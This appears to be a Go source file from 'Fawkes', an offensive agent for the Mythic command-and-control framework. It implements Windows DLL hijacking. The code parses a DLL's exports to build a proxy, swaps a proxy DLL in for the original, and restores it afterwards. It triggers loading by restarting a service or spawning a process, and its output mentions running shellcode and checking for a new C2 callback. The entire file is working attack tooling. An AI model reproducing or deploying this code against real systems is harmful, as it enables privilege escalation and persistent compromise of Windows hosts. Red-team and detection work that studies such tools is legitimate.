//go:build windows

package commands

import (
	"debug/pe"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

type hijackExportResult struct {
	Action      string             `json:"action"`
	OrigPath    string             `json:"orig_path"`
	OrigName    string             `json:"orig_name"`
	RenamedName string             `json:"renamed_name"`
	Arch        string             `json:"arch"`
	Exports     []proxyExportEntry `json:"exports"`
	TargetDir   string             `json:"target_dir,omitempty"`
}

func winHijackExecute(args privescCheckArgs) structs.CommandResult {
	if args.Source == "" {
		return errorResult("Error: 'source' is required — path to the DLL to proxy (e.g. C:\\Windows\\System32\\version.dll)")
	}

	srcPath, err := filepath.Abs(args.Source)
	if err != nil {
		return errorf("Error resolving path: %v", err)
	}

	if _, err := os.Stat(srcPath); err != nil {
		return errorf("DLL not found: %v", err)
	}

	f, err := os.Open(srcPath)
	if err != nil {
		return errorf("Error opening %s: %v", srcPath, err)
	}
	defer f.Close()

	peFile, err := pe.NewFile(f)
	if err != nil {
		return errorf("Error parsing PE file: %v", err)
	}
	defer peFile.Close()

	if peFile.Characteristics&pe.IMAGE_FILE_DLL == 0 {
		return errorf("%s is not a DLL (IMAGE_FILE_DLL not set)", filepath.Base(srcPath))
	}

	arch := "x64"
	switch peFile.Machine {
	case pe.IMAGE_FILE_MACHINE_I386:
		arch = "x86"
	case pe.IMAGE_FILE_MACHINE_ARM64:
		arch = "arm64"
	}

	var exportDir pe.DataDirectory
	switch opt := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		if len(opt.DataDirectory) > 0 {
			exportDir = opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]
		}
	case *pe.OptionalHeader32:
		if len(opt.DataDirectory) > 0 {
			exportDir = opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]
		}
	}

	if exportDir.VirtualAddress == 0 || exportDir.Size == 0 {
		return errorf("%s has no exports — nothing to proxy", filepath.Base(srcPath))
	}

	rawExports, _, err := parseExportDirectory(peFile, exportDir)
	if err != nil {
		return errorf("Error parsing exports: %v", err)
	}

	exports := make([]proxyExportEntry, 0, len(rawExports))
	for _, e := range rawExports {
		exports = append(exports, proxyExportEntry{
			Ordinal:   e.ordinal,
			Name:      e.name,
			Forwarder: e.forwarder,
		})
	}

	origName := filepath.Base(srcPath)
	renamedName := proxyRenamedDLLName(origName)

	result := hijackExportResult{
		Action:      "hijack-execute",
		OrigPath:    srcPath,
		OrigName:    origName,
		RenamedName: renamedName,
		Arch:        arch,
		Exports:     exports,
		TargetDir:   args.TargetDir,
	}

	data, err := json.Marshal(result)
	if err != nil {
		return errorf("Error: failed to marshal result: %v", err)
	}
	return successResult(string(data))
}

func winHijackDeploy(args privescCheckArgs) structs.CommandResult {
	if args.Source == "" {
		return errorResult("Error: 'source' is required — path to the compiled proxy DLL (download it first)")
	}
	if args.TargetDir == "" {
		return errorResult("Error: 'target_dir' is required — directory where the original DLL will be replaced")
	}
	if args.DLLName == "" {
		return errorResult("Error: 'dll_name' is required — original DLL filename (e.g. version.dll)")
	}

	proxyPath, err := filepath.Abs(args.Source)
	if err != nil {
		return errorf("Error resolving proxy path: %v", err)
	}
	targetDir, err := filepath.Abs(args.TargetDir)
	if err != nil {
		return errorf("Error resolving target directory: %v", err)
	}

	dllName := args.DLLName
	if !strings.HasSuffix(strings.ToLower(dllName), ".dll") {
		dllName += ".dll"
	}

	proxyData, err := os.ReadFile(proxyPath)
	if err != nil {
		return errorf("Error reading proxy DLL: %v", err)
	}

	origPath := filepath.Join(targetDir, dllName)
	renamedName := proxyRenamedDLLName(dllName)
	renamedPath := filepath.Join(targetDir, renamedName)

	if _, err := os.Stat(renamedPath); err == nil {
		return errorf("Renamed original already exists: %s — previous hijack may be in place. Clean up first.", renamedPath)
	}

	_, origExists := os.Stat(origPath)
	if origExists == nil {
		if err := os.Rename(origPath, renamedPath); err != nil {
			return errorf("Error renaming original DLL: %v — may need elevated privileges", err)
		}
	}

	destPath := filepath.Join(targetDir, dllName)
	if err := os.WriteFile(destPath, proxyData, 0644); err != nil {
		if origExists == nil {
			_ = os.Rename(renamedPath, origPath)
		}
		return errorf("Error writing proxy DLL: %v", err)
	}

	var sb strings.Builder
	sb.WriteString("[+] DLL hijack deployed\n")
	if origExists == nil {
		sb.WriteString(fmt.Sprintf("    Original:  %s → %s\n", origPath, renamedPath))
	} else {
		sb.WriteString(fmt.Sprintf("    Target:    %s (no original to rename)\n", destPath))
	}
	sb.WriteString(fmt.Sprintf("    Proxy:     %s (%d bytes)\n", destPath, len(proxyData)))
	sb.WriteString(fmt.Sprintf("\n--- Cleanup ---\n"))
	sb.WriteString(fmt.Sprintf("    securedelete %s\n", destPath))
	if origExists == nil {
		sb.WriteString(fmt.Sprintf("    mv %s %s\n", renamedPath, origPath))
	}

	return successResult(sb.String())
}

func winHijackCleanup(args privescCheckArgs) structs.CommandResult {
	if args.TargetDir == "" {
		return errorResult("Error: 'target_dir' is required — directory where the hijack was deployed")
	}
	if args.DLLName == "" {
		return errorResult("Error: 'dll_name' is required — original DLL filename (e.g. version.dll)")
	}

	targetDir, err := filepath.Abs(args.TargetDir)
	if err != nil {
		return errorf("Error resolving target directory: %v", err)
	}

	dllName := args.DLLName
	if !strings.HasSuffix(strings.ToLower(dllName), ".dll") {
		dllName += ".dll"
	}

	proxyPath := filepath.Join(targetDir, dllName)
	renamedName := proxyRenamedDLLName(dllName)
	renamedPath := filepath.Join(targetDir, renamedName)

	_, renamedExists := os.Stat(renamedPath)
	_, proxyExists := os.Stat(proxyPath)

	if renamedExists != nil && proxyExists != nil {
		return errorf("No hijack found: neither %s nor %s exists", proxyPath, renamedPath)
	}

	var sb strings.Builder
	sb.WriteString("[+] DLL hijack cleanup\n")

	if proxyExists == nil {
		if err := os.Remove(proxyPath); err != nil {
			return errorf("Error deleting proxy DLL %s: %v", proxyPath, err)
		}
		sb.WriteString(fmt.Sprintf("    Deleted proxy: %s\n", proxyPath))
	}

	if renamedExists == nil {
		origPath := filepath.Join(targetDir, dllName)
		if err := os.Rename(renamedPath, origPath); err != nil {
			return errorf("Error restoring original DLL: %v", err)
		}
		sb.WriteString(fmt.Sprintf("    Restored:      %s → %s\n", renamedPath, origPath))
	} else {
		sb.WriteString(fmt.Sprintf("    No original to restore (%s not found)\n", renamedPath))
	}

	sb.WriteString("\n[+] Hijack cleaned up successfully")
	return successResult(sb.String())
}

func winHijackTrigger(args privescCheckArgs) structs.CommandResult {
	trigger := strings.ToLower(args.Trigger)
	if trigger == "" {
		return errorResult("Error: 'trigger' is required — use 'restart' (restart a service) or 'spawn' (launch a process)")
	}

	switch trigger {
	case "restart":
		return hijackTriggerRestart(args)
	case "spawn":
		return hijackTriggerSpawn(args)
	default:
		return errorf("Unknown trigger type: %s. Use: restart, spawn", args.Trigger)
	}
}

func hijackTriggerRestart(args privescCheckArgs) structs.CommandResult {
	if args.ServiceName == "" {
		return errorResult("Error: 'service_name' is required for restart trigger — name of the service that loads the hijacked DLL")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to Service Control Manager: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.ServiceName)
	if err != nil {
		return errorf("Error opening service '%s': %v — verify the service name and that you have sufficient privileges", args.ServiceName, err)
	}
	defer s.Close()

	status, err := s.Query()
	if err != nil {
		return errorf("Error querying service '%s': %v", args.ServiceName, err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Triggering DLL hijack via service restart: %s\n", args.ServiceName))

	if status.State == svc.Running || status.State == svc.StartPending {
		sb.WriteString(fmt.Sprintf("[*] Stopping service (current state: %s)...\n", describeServiceState(status.State)))
		_, err = s.Control(svc.Stop)
		if err != nil {
			return errorf("Error stopping service '%s': %v — may need SYSTEM or service-specific permissions", args.ServiceName, err)
		}

		deadline := time.Now().Add(30 * time.Second)
		for time.Now().Before(deadline) {
			status, err = s.Query()
			if err != nil {
				return errorf("Error querying service '%s' during stop: %v", args.ServiceName, err)
			}
			if status.State == svc.Stopped {
				break
			}
			time.Sleep(500 * time.Millisecond)
		}
		if status.State != svc.Stopped {
			return errorf("Service '%s' did not stop within 30s (state: %s)", args.ServiceName, describeServiceState(status.State))
		}
		sb.WriteString("[+] Service stopped\n")
	} else {
		sb.WriteString(fmt.Sprintf("[*] Service already stopped (state: %s)\n", describeServiceState(status.State)))
	}

	sb.WriteString("[*] Starting service (will load DLLs from application directory)...\n")
	err = s.Start()
	if err != nil {
		sb.WriteString(fmt.Sprintf("[!] Service start failed: %v\n", err))
		sb.WriteString("[*] This may be expected if the proxy DLL caused an error during load\n")
		sb.WriteString("[*] Check if the shellcode executed despite the service start failure\n")
		return structs.CommandResult{
			Output:    sb.String(),
			Status:    "error",
			Completed: true,
		}
	}

	sb.WriteString("[+] Service started — proxy DLL should have been loaded\n")
	sb.WriteString("[+] If shellcode was a Fawkes payload, check for new callback in Mythic\n")
	return successResult(sb.String())
}

func hijackTriggerSpawn(args privescCheckArgs) structs.CommandResult {
	if args.Source == "" {
		return errorResult("Error: 'source' is required for spawn trigger — full path to the executable that loads the hijacked DLL")
	}

	exePath, err := filepath.Abs(args.Source)
	if err != nil {
		return errorf("Error resolving path: %v", err)
	}

	if _, err := os.Stat(exePath); err != nil {
		return errorf("Executable not found: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Triggering DLL hijack via process spawn: %s\n", exePath))

	cmd := safeCmd(exePath)
	cmd.Dir = filepath.Dir(exePath)
	err = cmd.Start()
	if err != nil {
		return errorf("Error spawning process: %v", err)
	}

	sb.WriteString(fmt.Sprintf("[+] Process spawned: PID %d\n", cmd.Process.Pid))
	sb.WriteString(fmt.Sprintf("[+] Working directory: %s\n", cmd.Dir))
	sb.WriteString("[+] DLL search order will load from the application directory first\n")
	sb.WriteString("[+] If shellcode was a Fawkes payload, check for new callback in Mythic\n")

	go func() {
		_ = cmd.Wait()
	}()

	return successResult(sb.String())
}
